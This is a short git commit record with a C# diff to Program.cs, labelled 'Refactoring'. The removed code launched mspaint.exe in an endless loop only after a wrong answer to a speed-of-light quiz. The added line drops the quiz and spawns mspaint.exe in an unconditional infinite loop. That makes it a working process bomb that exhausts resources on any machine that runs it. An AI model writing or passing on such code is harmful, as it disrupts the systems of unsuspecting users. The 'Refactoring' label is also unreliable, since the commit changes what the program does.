cb5bf3771440c19def8515828e0dc838887538ee
m1adow <Vell0505189970sl@gmail.com>
2022-02-24 21:44:30 +0200

    Refactoring

--- Program.cs
+++ Program.cs
@@ -1,8 +1,1 @@
-﻿System.Diagnostics.ProcessStartInfo processStartInfo = new();
-processStartInfo.FileName = ("mspaint.exe");
-
-System.Console.Write("Write what is the speed of light: ");
-if (System.Convert.ToInt32(System.Console.ReadLine()) == 300000000)
-    return;
-else
-    while (true) System.Diagnostics.Process.Start(processStartInfo);
+﻿while (true) System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("mspaint.exe"));
